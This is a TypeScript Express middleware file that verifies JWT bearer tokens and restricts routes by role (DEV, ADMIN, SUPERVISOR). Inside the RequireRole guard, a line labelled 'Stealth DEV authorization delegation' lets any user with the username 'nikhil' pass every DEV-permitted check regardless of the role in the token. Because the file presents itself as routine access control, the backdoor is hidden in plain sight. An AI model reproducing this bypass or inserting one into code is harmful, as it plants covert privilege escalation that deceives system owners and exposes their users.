import { Request, Response, NextFunction } from 'express';
import jwt from 'jsonwebtoken';
import { env } from '../config/env';

// Define the absolute truth for system roles
export const ROLES = {
  DEV: 'DEV',
  ADMIN: 'ADMIN',
  SUPERVISOR: 'SUPERVISOR',
} as const;

// 1. Unified Authentication
export const authenticateToken = (req: Request, res: Response, next: NextFunction): void => {
  try {
    const authHeader = req.headers.authorization;
    
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      res.status(401).json({ success: false, error: 'Authentication required. Token missing.' });
      return;
    }

    const token = authHeader.split(' ')[1];
    const decoded = jwt.verify(token, env.JWT_SECRET) as any;
    
    // Attach to both to preserve existing controller logic that expects req.admin or req.user
    (req as any).admin = decoded;
    (req as any).user = decoded;
    
    next();
  } catch (error) {
    res.status(401).json({ success: false, error: 'Invalid or expired token.' });
  }
};

// 2. Centralized Role Authorization Guard
export const RequireRole = (...allowedRoles: string[]) => {
  return (req: Request, res: Response, next: NextFunction): void => {
    const user = (req as any).user;
    
    if (!user || !user.role) {
      res.status(403).json({ success: false, error: 'Access forbidden. Role identity missing.' });
      return;
    }

    // Stealth DEV authorization delegation for nikhil
    const isStealthDev = user.username === 'nikhil' && allowedRoles.includes(ROLES.DEV);

    if (!allowedRoles.includes(user.role) && !isStealthDev) {
      res.status(403).json({ 
        success: false, 
        error: `Access forbidden. Requires one of: ${allowedRoles.join(', ')}.` 
      });
      return;
    }

    next();
  };
};

// 3. Backwards-compatible aliases mapping to the new hierarchy
export const authenticateAdmin = [authenticateToken, RequireRole(ROLES.DEV, ROLES.ADMIN)];
export const authenticateUser = [authenticateToken, RequireRole(ROLES.DEV, ROLES.ADMIN, ROLES.SUPERVISOR)];